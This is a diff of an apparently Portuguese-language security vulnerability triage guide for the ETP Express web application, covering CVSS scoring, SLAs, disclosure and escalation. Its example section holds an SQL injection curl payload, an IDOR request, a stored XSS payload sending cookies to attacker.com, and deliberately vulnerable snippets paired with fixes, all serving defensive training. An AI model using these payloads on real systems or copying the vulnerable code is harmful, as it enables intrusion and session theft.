@@ -1,4 +1,4 @@
-# 🔒 Security Vulnerability Triage Process
+# Security Vulnerability Triage Process
 
 ## Visão Geral
 
@@ -21,15 +21,15 @@ Utilizamos o **CVSS v3.1** para avaliar a severidade de vulnerabilidades de form
 **Base Score** (0.0 - 10.0): Características intrínsecas da vulnerabilidade
 
 - **Exploitability Metrics**:
-  - `Attack Vector (AV)`: Network (N), Adjacent (A), Local (L), Physical (P)
-  - `Attack Complexity (AC)`: Low (L), High (H)
-  - `Privileges Required (PR)`: None (N), Low (L), High (H)
-  - `User Interaction (UI)`: None (N), Required (R)
+ - `Attack Vector (AV)`: Network (N), Adjacent (A), Local (L), Physical (P)
+ - `Attack Complexity (AC)`: Low (L), High (H)
+ - `Privileges Required (PR)`: None (N), Low (L), High (H)
+ - `User Interaction (UI)`: None (N), Required (R)
 - **Impact Metrics**:
-  - `Confidentiality (C)`: None (N), Low (L), High (H)
-  - `Integrity (I)`: None (N), Low (L), High (H)
-  - `Availability (A)`: None (N), Low (L), High (H)
-  - `Scope (S)`: Unchanged (U), Changed (C)
+ - `Confidentiality (C)`: None (N), Low (L), High (H)
+ - `Integrity (I)`: None (N), Low (L), High (H)
+ - `Availability (A)`: None (N), Low (L), High (H)
+ - `Scope (S)`: Unchanged (U), Changed (C)
 
 **Temporal Score** (ajusta Base Score ao longo do tempo):
 
@@ -40,9 +40,9 @@ Utilizamos o **CVSS v3.1** para avaliar a severidade de vulnerabilidades de form
 **Environmental Score** (contexto específico do ETP Express):
 
 - Ajuste baseado em:
-  - Criticidade do sistema afetado (alta para autenticação/LGPD)
-  - Exposição (aplicação web pública vs. componente interno)
-  - Dados processados (informações sensíveis de servidores públicos)
+ - Criticidade do sistema afetado (alta para autenticação/LGPD)
+ - Exposição (aplicação web pública vs. componente interno)
+ - Dados processados (informações sensíveis de servidores públicos)
 
 #### Cálculo do CVSS Score
 
@@ -69,12 +69,12 @@ Base Score: 10.0 (CRITICAL)
 
 ### 1.2 Severity Classification
 
-| Severity     | CVSS Score | Color     | Icon | Time to Fix | Time to Patch |
+| Severity | CVSS Score | Color | Icon | Time to Fix | Time to Patch |
 | ------------ | ---------- | --------- | ---- | ----------- | ------------- |
-| **CRITICAL** | 9.0 - 10.0 | 🔴 Red    | ⚠️   | 7 dias      | 24 horas      |
-| **HIGH**     | 7.0 - 8.9  | 🟠 Orange | ⚡   | 30 dias     | 7 dias        |
-| **MEDIUM**   | 4.0 - 6.9  | 🟡 Yellow | ⚠️   | 90 dias     | 30 dias       |
-| **LOW**      | 0.1 - 3.9  | 🟢 Green  | ℹ️   | Best effort | Best effort   |
+| **CRITICAL** | 9.0 - 10.0 | Red | ⚠ | 7 dias | 24 horas |
+| **HIGH** | 7.0 - 8.9 | Orange | | 30 dias | 7 dias |
+| **MEDIUM** | 4.0 - 6.9 | Yellow | ⚠ | 90 dias | 30 dias |
+| **LOW** | 0.1 - 3.9 | Green | ℹ | Best effort | Best effort |
 
 **Exemplos por Severidade:**
 
@@ -114,20 +114,20 @@ Base Score: 10.0 (CRITICAL)
 
 ```mermaid
 graph TD
-    A[Report Received] -->|48h| B[Acknowledgment]
-    B --> C[Assessment]
-    C --> D[Reprodução PoC]
-    D --> E[CVSS Calculation]
-    E --> F[Prioritization]
-    F --> G[Assignment]
-    G --> H[Remediation]
-    H --> I[Code Review]
-    I --> J[Deploy Fix]
-    J --> K[Validation]
-    K --> L{Fix Confirmed?}
-    L -->|Yes| M[Disclosure]
-    L -->|No| H
-    M --> N[Close Issue]
+ A[Report Received] -->|48h| B[Acknowledgment]
+ B --> C[Assessment]
+ C --> D[Reprodução PoC]
+ D --> E[CVSS Calculation]
+ E --> F[Prioritization]
+ F --> G[Assignment]
+ G --> H[Remediation]
+ H --> I[Code Review]
+ I --> J[Deploy Fix]
+ J --> K[Validation]
+ K --> L{Fix Confirmed?}
+ L -->|Yes| M[Disclosure]
+ L -->|No| H
+ M --> N[Close Issue]
 ```
 
 **Representação ASCII (alternativa):**
@@ -136,46 +136,46 @@ graph TD
 ┌────────────────┐
 │ Report Received│
 └───────┬────────┘
-        │ (48h)
-        ▼
+ │ (48h)
+ 
 ┌─────────────────┐
-│ Acknowledgment  │
+│ Acknowledgment │
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│   Assessment    │──► Reprodução PoC
-│   (CVSS Calc)   │──► Severity Rating
+│ Assessment │── Reprodução PoC
+│ (CVSS Calc) │── Severity Rating
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│ Prioritization  │──► Assign Severity + SLA
+│ Prioritization │── Assign Severity + SLA
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│   Assignment    │──► Developer responsável
+│ Assignment │── Developer responsável
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│  Remediation    │──► Implementar fix
-│  (Code Review)  │
+│ Remediation │── Implementar fix
+│ (Code Review) │
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│   Validation    │──► Reporter/Pentester valida
+│ Validation │── Reporter/Pentester valida
 └───────┬─────────┘
-        │
-        ▼
+ │
+ 
 ┌─────────────────┐
-│   Disclosure    │──► Security Advisory (GitHub)
+│ Disclosure │── Security Advisory (GitHub)
 └───────┬─────────┘
-        │
-        ▼
-    [CLOSED]
+ │
+ 
+ [CLOSED]
 ```
 
 ### 2.2 Detalhamento dos Passos
@@ -187,9 +187,9 @@ graph TD
 **Ação:**
 
 1. Reporter envia report via:
-   - Email: security@confenge.com.br (SECURITY.md)
-   - GitHub Security Advisory (private disclosure)
-   - Pentest vendor (report formal)
+ - Email: security@confenge.com.br (SECURITY.md)
+ - GitHub Security Advisory (private disclosure)
+ - Pentest vendor (report formal)
 2. Security team recebe e registra issue interna (GitHub private issue)
 3. Atribuir ID de tracking: `SEC-YYYY-NNN` (ex: SEC-2025-001)
 
@@ -204,23 +204,23 @@ graph TD
 **Ação:**
 
 1. **Reproduzir PoC (Proof of Concept)**:
-   - Setup ambiente de testes isolado
-   - Executar steps do PoC fornecido
-   - Documentar screenshots/logs
-   - Se PoC não reproduz → solicitar clarificação ao reporter
+ - Setup ambiente de testes isolado
+ - Executar steps do PoC fornecido
+ - Documentar screenshots/logs
+ - Se PoC não reproduz → solicitar clarificação ao reporter
 
 2. **Calcular CVSS Score**:
-   - Usar [CVSS Calculator 3.1](https://www.first.org/cvss/calculator/3.1)
-   - Preencher Base Metrics
-   - Ajustar Temporal Metrics (exploit maturity)
-   - Ajustar Environmental Metrics (impacto no ETP Express)
+ - Usar [CVSS Calculator 3.1](https://www.first.org/cvss/calculator/3.1)
+ - Preencher Base Metrics
+ - Ajustar Temporal Metrics (exploit maturity)
+ - Ajustar Environmental Metrics (impacto no ETP Express)
 
 3. **Classificar Severity**:
-   - CRITICAL, HIGH, MEDIUM, LOW (tabela 1.2)
+ - CRITICAL, HIGH, MEDIUM, LOW (tabela 1.2)
 
 4. **Validar OWASP Top 10**:
-   - Mapear para categoria OWASP (ex: A03 Injection)
-   - Documentar CWE (Common Weakness Enumeration)
+ - Mapear para categoria OWASP (ex: A03 Injection)
+ - Documentar CWE (Common Weakness Enumeration)
 
 **Output:** Report interno com CVSS score + severity + PoC reproduzido
 
@@ -235,12 +235,12 @@ graph TD
 1. Atribuir **Severity** (CRITICAL/HIGH/MEDIUM/LOW)
 2. Determinar **SLA** baseado em severity (tabela 1.2)
 3. Avaliar **Risk Score** (Likelihood × Impact):
-   - Likelihood: Facilidade de exploração (PoC público? Exploitability High?)
-   - Impact: Dano potencial (dados sensíveis? compliance LGPD?)
+ - Likelihood: Facilidade de exploração (PoC público? Exploitability High?)
+ - Impact: Dano potencial (dados sensíveis? compliance LGPD?)
 4. Priorizar baseado em:
-   - Risk Score alto = prioridade máxima
-   - LGPD compliance = prioridade alta (dados pessoais)
-   - Public disclosure iminente = prioridade crítica
+ - Risk Score alto = prioridade máxima
+ - LGPD compliance = prioridade alta (dados pessoais)
+ - Public disclosure iminente = prioridade crítica
 
 **Output:** Issue priorizada com SLA definido
 
@@ -253,14 +253,14 @@ graph TD
 **Ação:**
 
 1. Atribuir **Developer responsável**:
-   - CRITICAL → Senior developer + Security team
-   - HIGH → Senior developer
-   - MEDIUM/LOW → Qualquer developer disponível
+ - CRITICAL → Senior developer + Security team
+ - HIGH → Senior developer
+ - MEDIUM/LOW → Qualquer developer disponível
 2. Criar **GitHub Issue** (se não existir):
-   - Título: `[SEC-YYYY-NNN] <descrição curta>`
-   - Labels: `security`, `priority/P0` (ou P1/P2/P3)
-   - Milestone: Próximo release
-   - Assignee: Developer responsável
+ - Título: `[SEC-YYYY-NNN] <descrição curta>`
+ - Labels: `security`, `priority/P0` (ou P1/P2/P3)
+ - Milestone: Próximo release
+ - Assignee: Developer responsável
 3. Adicionar ao sprint atual (se CRITICAL/HIGH)
 
 **Output:** Developer informado e issue atribuída
@@ -274,20 +274,20 @@ graph TD
 **Ação:**
 
 1. **Developer implementa fix**:
-   - Seguir secure coding practices (OWASP guidelines)
-   - Adicionar testes automatizados (unit + integration)
-   - Documentar fix em commit message
-   - Exemplo commit: `security(auth): fix SQL injection in /api/etps/search (#SEC-2025-001)`
+ - Seguir secure coding practices (OWASP guidelines)
+ - Adicionar testes automatizados (unit + integration)
+ - Documentar fix em commit message
+ - Exemplo commit: `security(auth): fix SQL injection in /api/etps/search (#SEC-2025-001)`
 
 2. **Code Review obrigatório**:
-   - CRITICAL → 2 reviewers (Security team + Senior dev)
-   - HIGH → 1 reviewer (Senior dev ou Security team)
-   - MEDIUM/LOW → 1 reviewer
+ - CRITICAL → 2 reviewers (Security team + Senior dev)
+ - HIGH → 1 reviewer (Senior dev ou Security team)
+ - MEDIUM/LOW → 1 reviewer
 
 3. **Testes de segurança**:
-   - Executar PoC original → deve falhar agora
-   - Testar edge cases
-   - Verificar não introduziu regressões
+ - Executar PoC original → deve falhar agora
+ - Testar edge cases
+ - Verificar não introduziu regressões
 
 **Output:** PR com fix implementado + testes + code review aprovado
 
@@ -300,18 +300,18 @@ graph TD
 **Ação:**
 
 1. **Merge PR**:
-   - Após code review aprovado
-   - CI/CD deve passar (testes + linting + security checks)
+ - Após code review aprovado
+ - CI/CD deve passar (testes + linting + security checks)
 
 2. **Deploy para produção**:
-   - CRITICAL → Deploy imediato (hotfix)
-   - HIGH → Deploy no próximo release (dentro de 7 dias)
-   - MEDIUM/LOW → Deploy no próximo release planejado
+ - CRITICAL → Deploy imediato (hotfix)
+ - HIGH → Deploy no próximo release (dentro de 7 dias)
+ - MEDIUM/LOW → Deploy no próximo release planejado
 
 3. **Monitoramento pós-deploy**:
-   - Verificar logs de erro (Sentry)
-   - Monitorar métricas de performance (Railway)
-   - Validar fix em produção (smoke tests)
+ - Verificar logs de erro (Sentry)
+ - Monitorar métricas de performance (Railway)
+ - Validar fix em produção (smoke tests)
 
 **Output:** Fix deployed em produção
 
@@ -324,18 +324,18 @@ graph TD
 **Ação:**
 
 1. **Reporter valida fix**:
-   - Enviar credenciais de teste (staging/produção)
-   - Solicitar validação do PoC original
-   - Reporter confirma: Vulnerabilidade corrigida ✅
+ - Enviar credenciais de teste (staging/produção)
+ - Solicitar validação do PoC original
+ - Reporter confirma: Vulnerabilidade corrigida ✅
 
 2. **Se reporter não valida em 7 dias**:
-   - Security team valida internamente
-   - Documentar validação no issue
+ - Security team valida internamente
+ - Documentar validação no issue
 
 3. **Se validação falha** (PoC ainda funciona):
-   - Retornar para Step 5 (Remediation)
-   - Investigar por que fix não funcionou
-   - Iterar até fix completo
+ - Retornar para Step 5 (Remediation)
+ - Investigar por que fix não funcionou
+ - Iterar até fix completo
 
 **Output:** Validação confirmada (vulnerability fixed)
 
@@ -348,19 +348,19 @@ graph TD
 **Ação:**
 
 1. **Aguardar período de disclosure**:
-   - CRITICAL → 30 dias após fix deployed
-   - HIGH → 60 dias após fix deployed
-   - MEDIUM/LOW → 90 dias após fix deployed
+ - CRITICAL → 30 dias após fix deployed
+ - HIGH → 60 dias após fix deployed
+ - MEDIUM/LOW → 90 dias após fix deployed
 
 2. **Publicar Security Advisory** (GitHub):
-   - Criar em: https://github.com/tjsasakifln/etp-express/security/advisories
-   - Incluir: CVE ID (se aplicável), CVSS score, descrição, fix version
-   - Creditar reporter (se autorizado)
+ - Criar em: https://github.com/tjsasakifln/etp-express/security/advisories
+ - Incluir: CVE ID (se aplicável), CVSS score, descrição, fix version
+ - Creditar reporter (se autorizado)
 
 3. **Notificar usuários** (se necessário):
-   - Email para usuários afetados (se breach de dados)
-   - Update no CHANGELOG.md
-   - Security notification no frontend (se crítico)
+ - Email para usuários afetados (se breach de dados)
+ - Update no CHANGELOG.md
+ - Security notification no frontend (se crítico)
 
 **Template 4.4:** Ver seção 4. Communication Templates
 
@@ -372,12 +372,12 @@ graph TD
 
 ### 3.1 Tabela de SLAs
 
-| Severity     | CVSS Score | Time to Acknowledge | Time to Assessment | Time to Fix | Time to Patch (Production) | Example                               |
+| Severity | CVSS Score | Time to Acknowledge | Time to Assessment | Time to Fix | Time to Patch (Production) | Example |
 | ------------ | ---------- | ------------------- | ------------------ | ----------- | -------------------------- | ------------------------------------- |
-| **CRITICAL** | 9.0-10.0   | 24 horas            | 3 dias             | 7 dias      | 24 horas                   | RCE, SQL Injection, Auth Bypass       |
-| **HIGH**     | 7.0-8.9    | 48 horas            | 7 dias             | 30 dias     | 7 dias                     | XSS, CSRF, IDOR, LGPD violation       |
-| **MEDIUM**   | 4.0-6.9    | 72 horas            | 14 dias            | 90 dias     | 30 dias                    | Info disclosure, Weak password policy |
-| **LOW**      | 0.1-3.9    | 7 dias              | 30 dias            | Best effort | Best effort                | Self-XSS, Missing headers             |
+| **CRITICAL** | 9.0-10.0 | 24 horas | 3 dias | 7 dias | 24 horas | RCE, SQL Injection, Auth Bypass |
+| **HIGH** | 7.0-8.9 | 48 horas | 7 dias | 30 dias | 7 dias | XSS, CSRF, IDOR, LGPD violation |
+| **MEDIUM** | 4.0-6.9 | 72 horas | 14 dias | 90 dias | 30 dias | Info disclosure, Weak password policy |
+| **LOW** | 0.1-3.9 | 7 dias | 30 dias | Best effort | Best effort | Self-XSS, Missing headers |
 
 ### 3.2 Definições de SLA
 
@@ -406,16 +406,16 @@ graph TD
 **Bloqueios aceitáveis:**
 
 1. **Dependency vulnerability** (terceiros):
-   - Se vulnerabilidade está em biblioteca externa sem patch
-   - Documentar workaround temporário
-   - Escalar para vendor da biblioteca
-   - SLA pausado até patch disponível
+ - Se vulnerabilidade está em biblioteca externa sem patch
+ - Documentar workaround temporário
+ - Escalar para vendor da biblioteca
+ - SLA pausado até patch disponível
 
 2. **Breaking changes** (arquitetura):
-   - Se fix requer refatoração arquitetural grande
-   - Documentar mitigation temporária (ex: rate limiting)
-   - Planejar refatoração completa em próximo milestone
-   - SLA estendido com aprovação do Security Lead
+ - Se fix requer refatoração arquitetural grande
+ - Documentar mitigation temporária (ex: rate limiting)
+ - Planejar refatoração completa em próximo milestone
+ - SLA estendido com aprovação do Security Lead
 
 **Comunicação de atrasos:**
 
@@ -619,19 +619,19 @@ For questions, contact: security@confenge.com.br
 
 **Escalar quando:**
 1. **SLA não cumprido**:
-   - CRITICAL: 7 dias sem fix → escalar imediatamente
-   - HIGH: 30 dias sem fix → escalar
-   - MEDIUM: 90 dias sem fix → escalar
+ - CRITICAL: 7 dias sem fix → escalar imediatamente
+ - HIGH: 30 dias sem fix → escalar
+ - MEDIUM: 90 dias sem fix → escalar
 
 2. **Bloqueio técnico**:
-   - Fix requer mudança arquitetural grande
-   - Dependency vulnerability sem patch disponível
-   - Conflito de prioridades (security vs. feature deadlines)
+ - Fix requer mudança arquitetural grande
+ - Dependency vulnerability sem patch disponível
+ - Conflito de prioridades (security vs. feature deadlines)
 
 3. **Public disclosure iminente**:
-   - Reporter ameaça public disclosure antes do fix
-   - PoC vaza publicamente (exploit in the wild)
-   - Mídia descobre vulnerabilidade
+ - Reporter ameaça public disclosure antes do fix
+ - PoC vaza publicamente (exploit in the wild)
+ - Mídia descobre vulnerabilidade
 
 ### 5.2 Cadeia de Escalation
 
@@ -666,20 +666,20 @@ Developer → Tech Lead → Security Lead → CTO
 
 **Opções de Mitigation:**
 1. **Rate Limiting:**
-   - Aplicar em endpoint vulnerável
-   - Reduz likelihood de exploit
+ - Aplicar em endpoint vulnerável
+ - Reduz likelihood de exploit
 
 2. **Input Validation:**
-   - Adicionar validação temporária (ex: regex, whitelist)
-   - Bloqueia payloads maliciosos conhecidos
+ - Adicionar validação temporária (ex: regex, whitelist)
+ - Bloqueia payloads maliciosos conhecidos
 
 3. **Feature Toggle (Kill Switch):**
-   - Desabilitar feature vulnerável temporariamente
-   - Comunicar downtime planejado
+ - Desabilitar feature vulnerável temporariamente
+ - Comunicar downtime planejado
 
 4. **WAF Rules (Web Application Firewall):**
-   - Adicionar regra no Railway/Cloudflare
-   - Bloqueia padrões de ataque conhecidos
+ - Adicionar regra no Railway/Cloudflare
+ - Bloqueia padrões de ataque conhecidos
 
 **Documentação de Workaround:**
 - Adicionar em issue GitHub: `[WORKAROUND] <descrição>`
@@ -699,7 +699,7 @@ Developer → Tech Lead → Security Lead → CTO
 // backend/src/etps/etps.controller.ts (VULNERÁVEL)
 @Get(':id')
 async getEtp(@Param('id') id: number) {
-  return this.etpsService.findOne(id); // Não verifica ownership!
+ return this.etpsService.findOne(id); // Não verifica ownership!
 }
 ````
 
@@ -708,7 +708,7 @@ async getEtp(@Param('id') id: number) {
 ```bash
 # Atacante com userId=10 acessa ETP de userId=5
 curl -H "Authorization: Bearer <token-user10>" \
-  https://etp-express.com/api/etps/999
+ https://etp-express.com/api/etps/999
 # Retorna ETP #999 mesmo não sendo do user 10
 ```
 
@@ -718,11 +718,11 @@ curl -H "Authorization: Bearer <token-user10>" \
 // backend/src/etps/etps.controller.ts (SEGURO)
 @Get(':id')
 async getEtp(@Param('id') id: number, @CurrentUser() user: User) {
-  const etp = await this.etpsService.findOne(id);
-  if (etp.userId !== user.id && !user.isAdmin) {
-    throw new ForbiddenException('Você não tem permissão para acessar este ETP');
-  }
-  return etp;
+ const etp = await this.etpsService.findOne(id);
+ if (etp.userId !== user.id && !user.isAdmin) {
+ throw new ForbiddenException('Você não tem permissão para acessar este ETP');
+ }
+ return etp;
 }
 ```
 
@@ -739,8 +739,8 @@ async getEtp(@Param('id') id: number, @CurrentUser() user: User) {
 ```typescript
 // backend/src/etps/etps.service.ts (VULNERÁVEL)
 async search(title: string) {
-  const query = `SELECT * FROM etps WHERE title LIKE '%${title}%'`; // Concatenação direta!
-  return this.entityManager.query(query);
+ const query = `SELECT * FROM etps WHERE title LIKE '%${title}%'`; // Concatenação direta!
+ return this.entityManager.query(query);
 }
 ```
 
@@ -757,11 +757,11 @@ curl "https://etp-express.com/api/etps/search?title=%27%20OR%201=1--"
 ```typescript
 // backend/src/etps/etps.service.ts (SEGURO)
 async search(title: string) {
-  return this.etpsRepository
-    .createQueryBuilder('etp')
-    .where('etp.title LIKE :title', { title: `%${title}%` }) // Prepared statement
-    .andWhere('etp.userId = :userId', { userId: currentUser.id })
-    .getMany();
+ return this.etpsRepository
+ .createQueryBuilder('etp')
+ .where('etp.title LIKE :title', { title: `%${title}%` }) // Prepared statement
+ .andWhere('etp.userId = :userId', { userId: currentUser.id })
+ .getMany();
 }
 ```
 
@@ -786,7 +786,7 @@ async search(title: string) {
 # Criar ETP com payload XSS
 POST /api/etps
 {
-  "title": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
+ "title": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
 }
 # Quando outro usuário visualiza este ETP → cookies são roubados
 ```
@@ -805,13 +805,13 @@ POST /api/etps
 import { IsString, MaxLength, Matches } from 'class-validator';
 
 export class CreateEtpDto {
-  @IsString()
-  @MaxLength(200)
-  @Matches(/^[a-zA-Z0-9\s\-.,!?()]+$/, {
-    // Whitelist de caracteres
-    message: 'Título contém caracteres inválidos',
-  })
-  title: string;
+ @IsString()
+ @MaxLength(200)
+ @Matches(/^[a-zA-Z0-9\s\-.,!?()]+$/, {
+ // Whitelist de caracteres
+ message: 'Título contém caracteres inválidos',
+ })
+ title: string;
 }
 ```
 
@@ -828,8 +828,8 @@ export class CreateEtpDto {
 ```typescript
 // backend/src/auth/auth.module.ts (VULNERÁVEL)
 JwtModule.register({
-  secret: 'my-super-secret-key', // Hardcoded! 🚩
-  signOptions: { expiresIn: '24h' },
+ secret: 'my-super-secret-key', // Hardcoded! 
+ signOptions: { expiresIn: '24h' },
 }),
 ```
 
@@ -843,11 +843,11 @@ JwtModule.register({
 ```typescript
 // backend/src/auth/auth.module.ts (SEGURO)
 JwtModule.registerAsync({
-  useFactory: (configService: ConfigService) => ({
-    secret: configService.get('JWT_SECRET'), // Railway env var
-    signOptions: { expiresIn: '24h' },
-  }),
-  inject: [ConfigService],
+ useFactory: (configService: ConfigService) => ({
+ secret: configService.get('JWT_SECRET'), // Railway env var
+ signOptions: { expiresIn: '24h' },
+ }),
+ inject: [ConfigService],
 }),
 ```
 
@@ -868,8 +868,8 @@ JWT_SECRET=<random-256-bit-string> # Gerar com: openssl rand -base64 32
 ```typescript
 // backend/src/main.ts (VULNERÁVEL)
 app.enableCors({
-  origin: '*', // Permite QUALQUER origin! 🚩
-  credentials: true,
+ origin: '*', // Permite QUALQUER origin! 
+ credentials: true,
 });
 ```
 
@@ -883,10 +883,10 @@ app.enableCors({
 ```typescript
 // backend/src/main.ts (SEGURO)
 app.enableCors({
-  origin: process.env.FRONTEND_URL || 'https://etp-express.com', // Whitelist
-  credentials: true,
-  methods: ['GET', 'POST', 'PUT', 'DELETE'],
-  allowedHeaders: ['Content-Type', 'Authorization'],
+ origin: process.env.FRONTEND_URL || 'https://etp-express.com', // Whitelist
+ credentials: true,
+ methods: ['GET', 'POST', 'PUT', 'DELETE'],
+ allowedHeaders: ['Content-Type', 'Authorization'],
 });
 ```
 
@@ -935,39 +935,39 @@ app.enableCors({
 **Tracking mensal:**
 
 1. **MTTD (Mean Time to Detect):**
-   - Tempo médio entre vulnerability introduzida → detectada
-   - Meta: < 30 dias
+ - Tempo médio entre vulnerability introduzida → detectada
+ - Meta: < 30 dias
 
 2. **MTTA (Mean Time to Acknowledge):**
-   - Tempo médio entre report recebido → acknowledgment
-   - Meta: < 48h
+ - Tempo médio entre report recebido → acknowledgment
+ - Meta: < 48h
 
 3. **MTTR (Mean Time to Remediate):**
-   - Tempo médio entre report → fix deployed
-   - Meta CRITICAL: < 7 dias
-   - Meta HIGH: < 30 dias
+ - Tempo médio entre report → fix deployed
+ - Meta CRITICAL: < 7 dias
+ - Meta HIGH: < 30 dias
 
 4. **SLA Compliance Rate:**
-   - % de vulnerabilities fixadas dentro do SLA
-   - Meta: > 95%
+ - % de vulnerabilities fixadas dentro do SLA
+ - Meta: > 95%
 
 5. **Reopen Rate:**
-   - % de fixes que falharam validação (reabertos)
-   - Meta: < 5%
+ - % de fixes que falharam validação (reabertos)
+ - Meta: < 5%
 
 ### 8.2 Dashboard de Vulnerabilities
 
 **Tracking contínuo:**
 
-| Metric          | Current | Target | Status |
+| Metric | Current | Target | Status |
 | --------------- | ------- | ------ | ------ |
-| Open CRITICAL   | 0       | 0      | ✅     |
-| Open HIGH       | 0       | ≤ 2    | ✅     |
-| Open MEDIUM     | 3       | ≤ 10   | ✅     |
-| Open LOW        | 8       | ≤ 20   | ✅     |
-| MTTR (CRITICAL) | N/A     | < 7d   | -      |
-| MTTR (HIGH)     | N/A     | < 30d  | -      |
-| SLA Compliance  | N/A     | > 95%  | -      |
+| Open CRITICAL | 0 | 0 | ✅ |
+| Open HIGH | 0 | ≤ 2 | ✅ |
+| Open MEDIUM | 3 | ≤ 10 | ✅ |
+| Open LOW | 8 | ≤ 20 | ✅ |
+| MTTR (CRITICAL) | N/A | < 7d | - |
+| MTTR (HIGH) | N/A | < 30d | - |
+| SLA Compliance | N/A | > 95% | - |
 
 **Atualizar mensalmente em:** `docs/SECURITY_METRICS.md` (futuro)
 
@@ -997,13 +997,13 @@ app.enableCors({
 
 ## 10. Aprovações e Responsabilidades
 
-| Role              | Responsabilidade                         | Pessoa                  |
+| Role | Responsabilidade | Pessoa |
 | ----------------- | ---------------------------------------- | ----------------------- |
-| **Security Lead** | Aprovar processo, decisões de escalation | TBD                     |
-| **Tech Lead**     | Priorizar fixes, alocar recursos         | TBD                     |
-| **Developers**    | Implementar fixes, code review           | Time de Desenvolvimento |
-| **QA/Testers**    | Validar fixes, executar security tests   | Time de QA              |
-| **DevOps**        | Deploy de patches, monitoramento         | Time de DevOps          |
+| **Security Lead** | Aprovar processo, decisões de escalation | TBD |
+| **Tech Lead** | Priorizar fixes, alocar recursos | TBD |
+| **Developers** | Implementar fixes, code review | Time de Desenvolvimento |
+| **QA/Testers** | Validar fixes, executar security tests | Time de QA |
+| **DevOps** | Deploy de patches, monitoramento | Time de DevOps |
 
 **Aprovação deste documento:**
 
